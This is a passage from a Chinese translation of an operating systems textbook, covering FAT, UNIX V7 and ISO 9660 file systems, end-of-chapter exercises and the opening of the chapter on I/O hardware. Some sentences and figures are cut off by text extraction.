于是就引进了FAT-16, 它有16位的磁盘指针， 而且允许8KB 、16KB和32KB的块大小(32768是用16位可以表示的2的最大幂)。
FAT-16表需要占据内 存128KB的空间。
由于当时已经有更大的内存，所以它很快就得到了应用，并且取代了FAT-12系统。
FAT-16能够支持的最大磁盘分区是2GB(64K 个项，每个项32KB), 支持最大8GB的磁盘，即4个分区， 每个分区2GB。
但是不可能永久这样。
对于商业信函来说，这个限制不是问题，但对于存储采用DV标准的数字视 频来说，一个2GB的文件仅能保存9分钟多一点的视频。
结果就是无论磁盘有多大，PC 的磁盘也只能支
持四个分区，能存储在磁盘中的最长的视频大约是38 分钟。
这一限制也意味着，能够在线编辑的最大的视 频少于19分钟，因为同时需要输入和输出文件。
随着Windows 95第2版的发行，引入了FAT-32文件 系统，它具有28位磁盘地址。
在Windwos 95下的MS- DOS也被改造，以适应FAT-32。
在这个系统中，分区 理论上能达到2²⁸×2¹⁵字节，但实际上是限制在2TB (2048GB), 因为系统在内部的512字节长的扇区中使 用了一个32位的数字来记录分区的大小，这样2⁹×2³2 是2TB。
对应不同的块大小以及所有三种FAT类型的最 大分区都在图4-31中表示出来。
除了支持更大的磁盘之外， FAT-32 文件系统相比
图4-31 对应不同的块大小的最大分区(空
格表示禁止这种组合)
FAT-16文件系统有另外两个优点。
首先，一个用FAT-32的8GB磁盘可以是一个分区，而使用FAT-16则必
须是四个分区，对于Windows 用户来说，就是 “C:”“D:”“E:” 和 “F:” 逻辑磁盘驱动器。
用户可以
自己决定哪个文件放在哪个盘以及记录的内容放在什么地方。
FAT-32相对于FAT-16的另外一个优点是，对于一个给定大小的硬盘分区，可以使用一个小一点的块 大小。
例如，对于一个2GB的硬盘分区，FAT-16 必须使用32KB的块，否则仅有的64K个磁盘地址就不能 覆盖整个分区。
相反，FAT-32处理一个2GB的硬盘分区的时候就能够使用4KB的块。
使用小块的好处是 大部分文件都小于32KB。
如果块大小是32KB, 那么一个10字节的文件就占用32KB的空间，如果文件 平均大小是8KB, 使用32KB的块大小，3/4的磁盘空间会被浪费，这不是使用磁盘的有效方法。
而8KB
的文件用4KB的块没有空间的损失，却会有更多的RAM被FAT系统占用。
把4KB的块应用到一个2GB的 磁盘分区，会有512K个块，所以FAT系统必须在内存里包含512K个项(占用了2MB的RAM)。
MS-DOS 使 用FAT来跟踪空闲磁盘块。
当前没有分配的任何块都会标上一个特殊的代码。
当MS- DOS 需要一个新的磁盘块时，它会搜索FAT以找到一个包含这个代码的项。
所以不需要位图或者空闲表。
4.5.2 UNIX V7 文件系统
即使是早期版本的UNIX也有一个相当复杂的多用户文件系统，因为它是从MULTICS继承下来的。
下面我们将会讨论V7文件系统，这是为PDP-11创建的一个文件系统，它也使得UNIX闻名于世。
我们将 在第10章通过Linux讨论现代UNIX的文件系统。
图4-32 UNIXV7 的目录表项
就像图4-13中的i节点一样，UNIX 的节点包含一些属性。
这些属性包括文件大小、三个时间(创建 时间，最后访问时间，最后修改时间)、所有者、所在组、保护信息以及一个计数(用于记录指向i节点的
对于特别大的文件，可以通过图4-13所示的方法来跟踪磁盘块。
前10个磁盘地址是存储在i节点自 身中的，所以对于小文件来说，所有必需的信息恰好是在i 节点中。
而当文件被打开时，i 节点将被从磁 盘取到内存中。
对于大一些的文件，i 节点内的其中一个地址是称为一次间接块 (single indirect block)
次间接块 (double indirect block)。
它包含一个块的地址，在这个块中包含若干个一次间接块。
每一个 这样的 一 次间接块指向数百个数据块。
如果这样还不够的话，可以使用三 次 间 接 块(triple indirect block)。
整个情况参见图4-33。
一次 间接块
二次 间接块
三次
间接块
图4-33 一个UNIX的节点
当打开某个文件时，文件系统必须要获得文件名并且定位它所在的磁盘块。
让我们来看一下怎样查 找路径名/usr/ast/mbox。
以 UNIX为例，但对所有的层次目录系统来说，这个算法是大致相同的。
首先， 文件系统定位根目录。
在UNIX系统中，根目录的i节点存放于磁盘上固定的位置。
从这个i节点，系统将 可以定位根目录，虽然根目录可以放在磁盘上的任何位置，但假定它放在磁盘块1的位置。
接下来，系统读根目录并且在根目录中查找路径的第一个分量usr, 以获取/usr 目录的i 节点号。
由i 节点号来定位i节点是很直接的，因为每个i节点在磁盘上都有固定的位置。
根据这个i节点，系统定位 /usr目录并在其中查找下一个分量ast 。
一 旦找到ast 的项，便找到了/usr/ast 目录的节点。
依据这个i 节点， 可以定位该目录并在其中查找mbox 。
然后，这个文件的节点被读入内存，并且在文件关闭之前会一直 保留在内存中。
图4-34显示了查找的过程。
根目录
查找usr得到 i节点6
/usr的节点6
i节点6说明 /usr在块132中
块132是 /usr目录
/usr/ast是 i节点26
/usr/ast的 i节点26
i 节点26说明
/usr/ast在块
406中
块406是 usr/ast目录
lusr/ast/mbox 是节点60
图4-34 查找/usr/ast/mbox 的过程
相对路径名的查找同绝对路径的查找方法相同，只不过是从当前工作目录开始查找而不是从根目录 开始。
每个目录都有.和. …项，它们是在目录创建的时候同时创建的。
.表项是当前目录的节点号，而.表 项是父目录(上 一层目录)的节点号。
这样，查找 ./dick/prog.c 的过程就成为在工作目录中查找…,寻 找父目录的节点号，并查询dick目录。
不需要专门的机制处理这些名字。
目录系统只要把这些名字看作 普通的ASCII 字符串即可，如同其他的名字一样。
这里唯一的巧妙之处是..在根目录中指向自身。
4.5.3 CD-ROM文件系统
作为最后一个文件系统实例，让我们来看看用于CD-ROM 的文件系统。
因为这些文件系统是为一次 性写介质设计的，所以非常简单。
例如，该文件系统不需要记录空闲块，这是因为一旦光盘生产出来后， CD-ROM 上的文件就不能被删除或者创建了。
下面我们来看看主要的CD-ROM 文件系统类型以及对这个 文件系统的两种扩展。
尽管只读光盘已经过时，但它仍旧是一种简单的存储手段，应用于DVD 和蓝光光 盘的文件系统也是基于CD-ROMS 开发出来的。
1.ISO 9660文件系统
CD-ROM 没有和磁盘一样的同心柱面，而是沿一个连续的螺旋线来顺序存储信息(当然，跨越螺旋 线查找也是可能的)。
螺旋上的位序列被划分成大小为2352字节的逻辑块(也称为逻辑扇区)。
这些块有 的用来进行引导，有的用来进行错误纠正或者其他一些用途。
每个逻辑块的有效部分是2048字节。
当用 于存放音乐时，CD 中有导入部分、导出部分以及轨道间的间隙，但是用于存储数据的CD-ROM 则没有 这些。
通常，螺旋上的逻辑块是按分钟或者秒进行分配的。
通过转换系数1秒=75块，则可以转换得到 相应的线性块号。
ISO 9660支持的CD-ROM集可以有多达2¹⁶-1个CD 。
每个单独的CD-ROM还可分为多个逻辑卷(分 区)。
下面我们重点考虑单个没有分区CD -ROM时的ISO 9660。
每个CD-ROM有16块作为开始，这16块的用途在ISO 9660标准中没有定义。
CD-ROM 制造商可以在 这一区域里放入引导程序，使计算机能够从CD-ROM引导，或者用于其他目的。
接下来的一块存放基本 卷描述符 (primary volume descriptor),基本卷描述符包含了CD-ROM的一些基本信息。
这些信息包括 系统标识符(32字节)、卷标识符(32字节)、发布标识符(128字节)和数据预备标识符(128字节)。
制造商可以在上面的几个域中填入需要的信息，但是为了跨平台的兼容性，不能使用大写字母、数字以 及很少一部分标点符号。
基本卷描述符还包含了三个文件的名字，这三个文件分别是存储概述、版权声明和文献信息。
除此 之外，还包含有一些关键数字信息，例如逻辑块的大小(通常为2048,但是在某些情况下可以是4096、 8192或者更大)、CD-ROM 所包含的块数目以及CD-ROM的创建日期和过期日期。
基本卷描述符也包含 了根目录的目录表项，说明根目录在CD-ROM 的位置(即从哪一块开始)。
从这个根目录，系统就能找 到其他文件所在的位置。
除 基 本 卷 描 述 符 之 外 ，CD-ROM 还包含有 一 个补充卷描述符 (supplementary volume descriptor)。
它和基本卷描述符包含类似的信息，在这里不再详细讨论。
根目录和所有的其他目录包含可变数目的目录项，目录中的最后一个目录项有一位用于标记该目录 项是目录中的最后一个。
目录项本身也是长度可变的。
每一个目录项由10到12个域构成，其中一些域是 ASCI 域，另外一些是二进制数字域。
二进制域被编码两次， 一个用于低地址结尾格式(例如在Pentium 上所用的),一个用于高地址结尾格式(例如在SPARC 上所用的)。
因此，一个16位的数字需要4个字节， 一个32位的数字需要8个字节。
这样冗余编码的目的主要是为了能在标准发展的同时照顾到各个方面的利益。
如果该标准仅规定低 地址结尾，那么在产品中使用高地址结尾的厂家就会觉得自己受到歧视，就不会接受这个标准。
所以我 们可以准确地用冗余的字节/小时数来衡量一张CD-ROM的情感因素。
ISO 9660目录项的格式如图4-35所示。
因为目录项是长度可变的，所以，第一个域就说明这一项的 长度。
这一字节被定义为高位在左，以避免混淆。
图4-35 ISO 9660的目录项
目录项可能包含有扩展属性。
如果使用了这个特性，则第二个字节就说明扩展属性的长度。
接下来是文件本身的起始块。
文件是以连续块的方式存储的，所以一个文件的位置完全可以由起始 块的位置和大小来确定。
起始块的下一个域就是文件大小。
CD-ROM 的日期和时间被记录在下一个域中，其中分隔的字节分别表示年、月、日、小时、分钟、 秒和时区。
年份是从1900年开始计数的，这意味着CD-ROM将会遇到2156年问题，因为在2155年之后将 会是1900年。
如果定义初始的日期为1988年(标准通过的那一年)的话，那么这个问题就可以推迟88年 产生，也就是2244年。
标志位域包含 一 些其他的位，包括 一个用来在打开目录时隐藏目录项(来自MS-DOS 的 特 性 ) 的 标 志位， 一个用以区分该项是文件还是目录的标志位， 一个用以标志是否使用扩展属性的标志位，以及一 个用来标志该项是否为目录中最后一项的标志位。
其他一些标志位也在这个域中，但是在此我们不再讨 论。
下一个域说明了在ISO 9660的最简版本中是否使用文件分隔块，这里也不做讨论。
再下一个域标明了该文件放在哪一个CD-ROM 上。
一个CD-ROM 的目录项可以引用在同一CD- ROM集中的另外一个CD-ROM 上的文件。
用这样的方法就可以在第一张CD-ROM 上建立一个主目录，
该主目录列出了在这个CD-ROM 集合中的其他所有CD-ROM 上的文件。
图4-35中标有L的域给出了文件名的大小(以字节为单位)。
之后的域就是文件名本身。
一个文件名 由基本名、一个点、扩展名、分号和二进制版本号(1或2个字节)构成。
基本名和扩展名可以使用大写 字母、数字0~9和下划线。
禁止使用其他字符以保证所有的机器都能处理这个文件名。
基本名最多可以 为8个字符，而扩展名最多可以为3个字符。
这样做是为了保证能和MS-DOS 兼容。
只要文件的版本号不 同，则相同的文件名可以在同一个目录中出现多次。
最后两个域不是必需的。
填充域用来保证每一个目录项都是偶数个字节，以2字节为边界对齐下一 项的数字域。
如果需要填充的话，就用0代替。
最后一个域是系统使用域，该域的功能和大小没有定义， 仅仅只要求该域为偶数个字节。
不同的系统对该域有不同的用途。
例如，Macintosh 系统就把此域用来 保存Finder标志。
一个目录中的项除了前两项之外，其余的都按字母顺序排列。
第一项表示当前目录本身，第二项表 示当前目录的父目录。
这和UNIX的. 目录项和.. 目录项相似。
而文件本身不需要按其目录项在目录中的 顺序来排列。
对于目录中目录项的数目没有特定的限制；但是对于目录的嵌套深度有限制，最大的目录嵌套深度 为8。
为了使得有关的实现简化一些，这个限制是任意设置的。
ISO 9660定义了三个级别。
级别1的限制最多，限制文件名使用上面提到的8+3个字符的表示法， 而且所有的文件必须是连续的(这些我们在前面介绍过)。
进而，目录名被限制在8个字符而且不能有扩 展名。
这个级别的使用，使得CD-ROM最有可能在所有的机器上读出。
级别2放宽了对长度的限制。
它允许文件和目录名多达31个字符，但是字符集还是一样的。
级别3使用和级别2同样的限制，但是文件不需要是连续的。
在这个级别上，一个文件可以由几个段 (extents) 构成，每一个段可以由若干连续分块构成。
同一个分块可以在一个文件中出现多次，也可以 出现在两个或者更多的文件中。
如果相当大的一部分数据在几个文件中重复，级别3则通过要求数据不 能出现多次来进行空间上的优化。
2.Rock Ridge扩展
正如上面所看到的，ISO 9660在很多方面有限制。
在这个标准公布不久，UNIX 工作者开始在这个 标准上进行扩展，使得在CD-ROM 上能实现UNIX文件系统。
这个扩展被命名为Rock Ridge,这个名字 来源于Gene Wilder的电影《Blazing Saddles》中一个小镇，也许委员会的成员之一喜欢这个电影，便以 此命名。
该扩展使用了系统使用域，使得Rock Ridge CD-ROM可以在所有计算机上可读。
其他所有的域仍 然保持ISO 9660标准中的定义。
所有其他不识别Rock Ridge扩展的系统只需要忽略这个扩展，把盘当作 普通的CD-ROM来识别即可。
该扩展分为下面几个域：
1)PX——POSIX 属性。
2)PN—— 主设备号和次设备号。
3)SL—— 符号链接。
4)NM—— 替代名。
5)CL—— 子位置。
6)PL—— 父位置。
7)RE—— 重定位。
8)TF—— 时间戳。
PX域包含了标准UNIX 的rwxrwxrwx 所有者、同组用户和其他用户权限位。
也包含了包含在模式字 中的其他位，如SETUID 位和SETGID 位等。
为了能在CD-ROM 上表示原始设备，需要PN域来表示。
该域包含了和文件相关的主设备号和次设 备号。
这样，/dev目录的内容就可以在写到CD-ROM 上之后在目标系统上正确地重新构造。
SL 域是符号链接，它允许在一个文件系统上的文件可以引用另一个文件系统上的文件。
最重要的域是NM域，它允许同一个文件可以关联第二个名字。
这个名字不受ISO 9660字符集和长 度的限制，这样使得在CD-ROM上可以表示任意的UNIX文件。
接下来的三个域一起用来消除ISO 9660中的对目录嵌套深度为8的限制。
使用这几个域可以指明一 个目录被重定位了，而且可以标明其层次结构。
这对于消除深度限制非常有用。
最后，TF 域包含了每个UNIX的i节点中的三个时间戳：文件创建时间、文件最后修改时间和文件最 后访问时间。
有了这些扩展，就可以将一个UNIX 文件系统复制到CD-ROM 上，并且能够在不同的系统 上正确恢复。
3.Joliet 扩展
UNIX委员会不是唯一对ISO 9660进行扩展的小组，微软也发现了这个标准有太多的限制(尽管这 些限制最初都是由于微软自己的MS-DOS引起的)。
所以微软也做了一些名为Joliet 的扩展。
这个扩展设 计的目的是，为了能够将Windows 文件系统复制到CD-ROM 上，并且能够恢复(与为UNIX 设计Rock Ridge的思路一样)。
实际上所有能在Windows 上运行的、使用CD-ROM 的程序都支持Joliet, 包括可写 CD的刻录程序。
通常这些程序都让用户选择是使用ISO 9660标准还是Joliet 标准。
Joliet 提供的主要扩展为：
1)长文件名。
2)Unicode 字符集。
3)比8层更深的目录嵌套深度。
4)带扩展名的目录。
第一个扩展允许文件名多达64字符。
第二个扩展允许文件名使用Unicode 字符集，这个扩展对那些 不使用拉丁字符集的国家非常重要，如日本、以色列和希腊。
因为Unicode 字符是2个字节的，所以Joliet 最长的文件名可以达到128字节。
和Rock Ridge一样，Joliet 同样消除了对目录嵌套深度的限制。
目录可以根据需要达到任意嵌套深 度。
最后，目录名也可以有扩展名。
目前还不清楚为什么有这个扩展，因为大多数的Windows 目录从来 没有扩展名，但或许有一天会用到。
4.6有关文件系统的研究
文件系统总是比操作系统的其他部分吸引了更多的研究，如今也是这样。
FAST 、MSST 和NAS这些 会议的大部分内容都在讨论文件和存储系统。
在标准的文件系统被完全理解的同时，还有很多后续研究， 包括备份 (Smaldone 等人，2013;Wallace 等人，2012)、高速缓存 (Koller 等 人 ；Oh,2012;Zhang 等 人，2013a) 、安全删除数据 (Wei 等人，2012)、文件压缩(Harnik 等人，2013)、Flash 文件系统 (No, 2012;Park 和Shen,2012;Narayanan,2009) 、 性 能 (Leventhal,2013;Schindler 等人，2011)、RAID
4.7 小结
从外部看，文件系统是一组文件和目录，以及对文件和目录的操作。
文件可以被读写，目录可以被 创建和删除，并可将文件从一个目录移到另一个目录中。
大多数现代操作系统都支持层次目录系统，其 中，目录中还有子目录，子目录中还可以有子目录，如此无限下去。
而在内部看，文件系统又是另一番景象。
文件系统的设计者必须考虑存储区是如何分配的，系统如
何记录哪个块分给了哪个文件。
可能的方案有连续文件、链表、文件分配表和i 节点等。
不同的系统有 不同的目录结构。
属性可以存在目录中或存在别处(比如，在i节点中)。
磁盘空间可以通过位图的空闲 表来管理。
通过增量转储以及用程序修复故障文件系统的方法，可以提高文件系统的可靠性。
文件系统 的性能非常重要，可以通过多种途径提高性能，包括高速缓存、预读取以及尽可能仔细地将一个文件中 的块紧密地放置在一起等方法。
日志结构文件系统通过大块单元写入的操作也可以改善性能。
文件系统的例子有ISO 9660 、MS-DOS以 及UNIX。
它们之间在怎样记录每个文件所使用的块、目 录结构以及对空闲磁盘空间管理等方面都存在着差别。
习题
1.给出文件/etc/passwd 的五种不同的路径名。
(提 示：考虑目录项“.”和“..”。
)
2. 在Windows 中，当用户双击资源管理器中列出 的一个文件时，就会运行一个程序，并以这个 文件作为参数。
操作系统需要知道运行的是哪 个程序，请给出两种不同的方法。
3. 在早期的UNIX系统中，可执行文件(a.out 文件) 以一个特定的魔数 (magic number) 而不是一 个随机选取的数字开头。
这些文件的开头是 header, 随后是文本段和数据段。
为什么可执 行文件要选取一个特定的数字，而其他类型的 文件会多少有些随机地选择魔数开头?
4. 在UNIX 中open 系统调用绝对需要吗?
如果没 有会产生什么结果?
5.在支持顺序文件的系统中总有一个文件回绕操作， 支持随机存取文件的系统是否也需要该操作?
6. 某一些操作系统提供系统调用rename 给文件重 命名，同样也可以通过把文件复制到新文件并 删除原文件而实现文件重命名。
请问这两种方 法有何不同?
8.有一个简单操作系统只支持单一目录结构，但 是允许该目录中有任意多个文件，且带有任意 长度的名字。
这样可以模拟层次文件系统吗?
如何进行?
9. 在UNIX和Windows中，通过使用一个特殊的系 统调用把文件的“当前位置”指针移到指定字 节，从而实现了随机访问。
请提出一个不使用 该系统调用完成随机存取的替代方案。
10.考虑图4-8中的目录树，如果当前工作目录是 /usr/jim,则相对路径名为../ast/x的文件的绝对 路径名是什么?
11.正如书中所提到的，文件的连续分配会导致磁 盘碎片，因为当一个文件的长度不等于块的整 数倍时，文件中的最后一个磁盘块中的空间会
浪费掉。
请问这是内碎片还是外碎片?
并将它 与先前一章的有关讨论进行比较。
12.描述一个损坏的数据块对以下三种形式的文 件的影响：(a) 连续的，(b) 链表的，(c) 索引的。
13.一种在磁盘上连续分配并且可以避免空洞的方 案是，每次删除一个文件后就紧缩一下磁盘。
由于所有的文件都是连续的，复制文件时需要 寻道和旋转延迟以便读取文件，然后全速传送。
在写回文件时要做同样的工作。
假设寻道时间 为5ms, 旋转延迟为4 ms, 传送速率为8MB/s, 而文件平均长度是8 KB, 把一个文件读入内 存并写回到磁盘上的一个新位置需要多长时 间?
运用这些数字，计算紧缩16GB磁盘的一 半需要多长时间?
14.基于前一个问题的答案，紧缩磁盘有什么作用吗?
15.某些数字消费设备需要存储数据，比如存放文 件等。
给出一个现代设备的名字，该设备需要 文件存储，并且适合连续的空间分配。
16. 考虑图4-13中的i节点。
如果它含有用4个字节 表示的10个直接地址，而且所有的磁盘块大小 是1024KB, 那么文件最大可能有多大?
17.一个班的学生信息存储在一个文件中，这些记 录可以被随意访问和更新。
假设每个学生的记 录大小都相同，那么在连续的、链表的和表格/ 索引的这三种分配方式中，哪种方式最合适?
18. 考虑一个大小始终在4KB和4MB之间变化的文 件，连续的、链表的和表格/索引的这三种分 配方式中，哪个方式最合适?
19. 有建议说，把短文件的数据存在i节点内会提 高效率并且节省磁盘空间。
对于图4-13中的i 节点，在i节点内可以存放多少字节的数据?
20.两个计算机科学系的学生Carolyn和Elinor正在 讨论i 节点。
Carolyn 认为存储器容量越来越大， 价格越来越便宜，所以当打开文件时，直接取 i 节点的副本，放到内存i节点表中，建立一个 新i节点将更简单、更快，没有必要搜索整个i
节点来判断它是否已经存在。
Elinor则不同意 这一观点。
他们两个人谁对?
21.说明硬链接优于符号链接的一个优点，并说明 符号链接优于硬链接的一个优点。
22.分别阐释硬链接和软链接与节点分配方式的 区别。
23.考虑一个块大小为4 KB、使用自由列表 (free- list method) 的 4TB的磁盘，多少个块地址可 以被存进一个块中?
24.空闲磁盘空间可用空闲块表或位图来跟踪。
假 设磁盘地址需要D位， 一个磁盘有B个块，其 中有F 个空闲。
在什么条件下，空闲块表采用 的空间少于位图?
设D为16位，请计算空闲磁 盘空间的百分比。
(a) 写入有5块的文件B。
(b) 删除文件A。
(c)写入有8块的文件C。
(d) 删除文件B。
26.如果因为系统崩溃而使存放空闲磁盘块信息的 空闲块表或位图完全丢失，会发生什么情况?
有什么办法从这个灾难中恢复吗，还是该磁盘 彻底无法使用?
分别就UNIX 和FAT-16文件系 统讨论你的答案。
28.在教材中我们详细讨论过增量转储。
在 Windows中很容易说明何时要转储一个文件， 因为每个文件都有一个存档位。
在UNIX中没 有这个位，那么UNIX 备份程序怎样知道哪个 文件需要转储?
29.假设图4-25中的文件21自上次转储之后没有修改 过，在什么情况下图4-26中的四张位图会不同?
30.有人建议每个UNIX文件的第一部分最好和其i 节 点放在同一个磁盘块中，这样做有什么好处?
31.考虑图4-27。
对某个特殊的块号，计数器的值 在两个表中有没有可能都是数值2?
这个问题
如何纠正?
32.文件系统的性能与高速缓存的命中率有很大的 关系(即在高速缓存中找到所需块的概率)。
从高速缓存中读取数据需要1ms, 而从磁盘上 读取需要40ms, 若命中率为h, 给出读取数据 所需平均时间的计算公式。
并画出h从0到1.0 变化时的函数曲线。
33. 对于与计算机相连接的一个外部USB硬盘驱动器， 通写高速缓存和块高速缓存哪种方式更合适?
34.考虑一个将学生记录存放在文件中的应用，它 以学生ID作为输入，随后读入、更新和写相应 的学生记录。
这个过程重复进行直到应用结束。
块预读 (block read-ahead)技术在这里适用吗?
35.考虑一个有10个数据块的磁盘，这些数据块从 块14到23。
有两个文件在这个磁盘上：f1和f2。
这个目录结构显示f1和f2的第一个数据块分别 为22和16。
给定FAT表项如下，哪些数据块被 分配给f1和f2?
(14,18);(15,17);(16,23);(17,21);(18,20); (19,15);(20,-1);(21,-1);(22,19);(23,14)
在上面的符号中，(x,y) 表示存储在表项x中的 值指向数据块y。
36.考虑图4-21背后的思想，目前磁盘平均寻道 时间为8ms, 旋转速率为15000rpm, 每道为 262144字节。
对大小各为1KB 、2KB 和4KB 的磁盘块，传送速率各是多少?
37.某个文件系统使用2KB 的磁盘块，而中间文件 大小值为1KB 。
如果所有的文件都是正好1KB 大，那么浪费掉的磁盘空间的比例是多少?
你 认为一个真正的文件系统所浪费的空间比这个 数值大还是小?
请说明理由。
38. 给定磁盘块大小为4KB, 块指针地址值为4字 节，使用10个直接地址 (direct address) 和一 个间接块 (indirect block) 可以访问的最大文 件大小是多少字节?
39.MS-DOS 中的文件必须在内存中的FAT-16表中 竞争空间。
如果某个文件使用了k个表项，其 他任何文件就不能使用这k个表项，这样会对 所有文件的总长度带来什么限制?
40. 一个UNIX 系统使用4KB磁盘块和4字节磁盘地 址。
如果每个i 节点中有10个直接表项以及一 个一次间接块、一个二次间接块和一个三次间 接块，那么文件最大为多大?
41. 对于文件/usr/ast/courses/os/handout.t, 若 要 获 取其i节点需要多少个磁盘操作?
假设其根目 录的i节点在内存中，其他路径都不在内存中。
并假设所有的目录都在一个磁盘块中。
42. 在许多UNIX 系统中，i 节点存放在磁盘的开始 处。
一种替代设计方案是，在文件创建时分配 i 节点，并把i 节点存放在该文件首个磁盘块的 开始处。
请讨论这个方案的优缺点。
43.编写一个将文件字节倒写的程序，这样最后一 个字节成为第一个字节，而第一个字节成为最 后一个字节。
程序必须适合任何长度的文件， 并保持适当的效率。
44.编写一个程序，该程序从给定的目录开始，从 此点开始沿目录树向下，记录所找到的所有文 件的大小。
在完成这一切之后，该程序应该打 印出文件大小分布的直方图，以该直方图的区 间宽度为参数(比如，区间宽度为1024,那么 大小为0~1023的文件同在一个区间宽度，大小 为1024~2047的文件同在下一个区间宽度，如 此类推)。
45. 编写一个程序，扫描UNIX 文件系统中的所有 目录，并发现和定位有两个或更多硬链接计数 的i节点。
对于每个这样的文件，列出指向该 文件的所有文件的名称。
46. 编 写UNIX 的新版1s程序。
这个版本将一个或 多个目录名作为变量，并列出每个目录中所有 的文件，一个文件一行。
每个域应该对其类型 进行合理的格式化。
仅列出第一个磁盘地址 (若该地址存在的话)。
47.实现一个程序，测量应用层缓冲区的大小对读 取时间造成的影响。
这包括对一个很大的文件 (比如2GB) 进行写和读操作。
改变应用缓冲 区大小(如从64B到4KB), 用定时测量程序 ( 如UNIX 上的gettimeofday 和getitimer) 来测 量不同大小的缓冲区需要的时间。
评估结果并 报告你的发现：缓冲区的大小会对整个写入时 间和每次写入时间造成影响吗?
48.实现一个模拟的文件系统，它被整个存储在磁 盘上一个普通文件中。
这个磁盘文件会包含目 录 、i节点、空闲块信息和文件数据块等。
选 择合适的算法来维护空闲块信息和分配数据块 (连续的，索引的，链表的)。
你的程序会接受 来自用户的系统命令，从而创建、删除目录， 创建、删除、打开文件，读取、写入一个指定 文件，列出目录的内容。
第5章
Modern Operating Systems,Fourth Edition
输入/输出
除了提供抽象(例如，进程、地址空间和文件)以外，操作系统还要控制计算机的所有I/O (输入/输出) 设备。
操作系统必须向设备发送命令，捕捉中断，并处理设备的各种错误。
它还应该在设备和系统的其他 部分之间提供简单且易于使用的接口。
如果有可能，这个接口对于所有设备都应该是相同的，这就是所谓 的设备无关性。
I/O部分的代码是整个操作系统的重要组成部分。
操作系统如何管理I/O是本章的主题。
本章的内容是这样组织的：首先介绍I/O硬件的基本原理，然后介绍一般的I/O软件。
I/O软件可以分 层构造，每层都有明确的任务。
我们将对这些软件层进行研究，看一看它们做些什么,以及如何在一起 配合工作。
5.1 I/O硬件原理
不同的人对于I/O 硬件的理解是不同的。
对于电子工程师而言，I/O 硬件就是芯片、导线、电源、电 机和其他组成硬件的物理部件。
对程序员而言，则只注意I/O硬件提供给软件的接口，如硬件能够接收 的命令、它能够实现的功能以及它能够报告的错误。
本书主要介绍怎样对I/O设备编程，而不是如何设 计、制造和维护硬件，因此，我们的讨论限于如何对硬件编程，而不是其内部的工作原理。
然而，很多 I/O设备的编程常常与其内部操作密切相关。
在下面三节中，我们将介绍与I/O 硬件编程有关的一般性背 景知识。
这些内容可以看成是对1.4节介绍性材料的复习和扩充。
5.1.1 I/O设备
I/O设备大致可以分为两类：块设备 (block device) 和字符设备 (character device)。
块设备把信息
存储在固定大小的块中，每个块有自己的地址。
通常块的大小在512字节至65536字节之间。
所有传输
以一个或多个完整的(连续的)块为单位。
块设备的 基本特征是每个块都能独立于其他块而读写。
硬盘、 蓝光光盘和USB盘是最常见的块设备。
如果仔细观察，块可寻址的设备与其他设备之间 并没有严格的界限。
磁盘是公认的块可寻址的设备， 因为无论磁盘臂当前处于什么位置，它总是能够寻址 其他柱面并且等待所需要的磁盘块旋转到磁头下面。
现在考虑虽然过时但仍在使用的磁带机，有时使用它 对磁盘进行备份(因为磁带很便宜)。
磁带包含按顺序 排列的块。
如果给出命令让磁带机读取第N块，它可以 首先向回倒带，然后再前进直到第N块。
该操作与磁盘 的寻道相类似，只是花费的时间更长。
不过，重写磁 带中间位置的块有可能做得到，也有可能做不到。
即 便有可能把磁带当作随机访问的块设备来使用，也是 有些勉为其难的，毕竟通常并不这样使用磁带。
另一类I/O设备是字符设备。
字符设备以字符为单 位发送或接收一个字符流，而不考虑任何块结构。
字 符设备是不可寻址的，也没有任何寻道操作。
打印机、 网络接口、鼠标(用作指点设备)、老鼠(用作心理学
图5-1 某些典型的设备、网络和总线的数据率
实验室实验),以及大多数与磁盘不同的设备都可看作字符设备。
这种分类方法并不完美，有些设备就没有包括进去。
例如，时钟既不是块可寻址的，也不产生或接 收字符流。
它所做的工作就是按照预先规定好的时间间隔产生中断。
内存映射的显示器也不适用于此模 型。
但是，块设备和字符设备的模型具有足够的一般性，可以用作使处理I/O 设备的某些操作系统软件具 有设备无关性的基础。
例如，文件系统只处理抽象的块设备，而把与设备相关的部分留给较低层的软件。
I/O 设备在速度上覆盖了巨大的范围，要使软件在跨越这么多数量级的数据率下保证性能优良，给 软件造成了相当大的压力。
图5-1列出了某些常见设备的数据率，这些设备中大多数随着时间的推移而 变得越来越快。
5.1.2 设备控制器
控制器卡上通常有一个连接器，通向设备本身的电缆可以插入到这个连接器中。
很多控制器可以操 作2个、4个甚至8个相同的设备。
如果控制器和设备之间采用的是标准接口，无论是官方的ANSI 、IEEE 或ISO 标准还是事实上的标准，各个公司都可以制造各种适合这个接口的控制器或设备。
例如，许多公 司都生产符合SATA 、SCSI 、USB 、Thunderbolt (雷电)或火线 (IEEE 1394) 接口的磁盘驱动器。
控制器与设备之间的接口通常是一个很低层次的接口。
例如，磁盘可以按每个磁道2000000个扇区， 每个扇区512字节进行格式化。
然而，实际从驱动器出来的却是一个串行的位(比特)流，它以一个前 导符 (preamble) 开始，接着是一个扇区中的4096位，最后是一个校验和，也称为错误校正码 (Error- Correcting Code,ECC)。
前导符是在对磁盘进行格式化时写上去的，它包括柱面数和扇区号、扇区大 小以及类似的数据，此外还包含同步信息。
控制器的任务是把串行的位流转换为字节块，并进行必要的错误校正工作。
字节块通常首先在控制器内 部的一个缓冲区中按位进行组装，然后再对校验和进行校验并证明字节块没有错误后，再将它复制到主存中。
在同样低的层次上，LCD 显示器的控制器也是一个位串行设备。
它从内存中读入包含待显示字符的 字节，产生信号以便使相应的像素改变背光的极化方式，从而将其写到屏幕上。
如果没有显示器控制器， 那么操作系统程序员只能对所有像素的电场显式地进行编程。
有了控制器，操作系统就可以用几个参数对 控制器进行初始化，这些参数包括每行的字符数或像素数以及每屏的行数等，并让控制器实际驱动电场。
在很短的时间里，LCD 屏幕已经完全取代了老式的CRT(Cathode Ray Tube,阴极射线管)监视器。
CRT监视器发射电子束到荧光屏上。
利用磁场，系统能够使电子束弯曲并且在屏幕上画出像素。
与LCD 屏幕相比，CRT监视器笨重、费电并且易碎。
此外，在今天的(视网膜)LCD屏幕上，分辨率已经好到 人眼不能区分单个像素的程度。
今天已经很难想象，过去的笔记本电脑带有小的CRT屏幕，有20cm厚， 重达12kg, 很适合健身。
5.1.3 内存映射I/O
每个控制器有几个寄存器用来与CPU 进行通信。
通过写入这些寄存器，操作系统可以命令设备发送 数据、接收数据、开启或关闭，或者执行某些其他操作。
通过读取这些寄存器，操作系统可以了解设备 的状态，是否准备好接收一个新的命令等。
除了这些控制寄存器以外，许多设备还有一个操作系统可以读写的数据缓冲区。
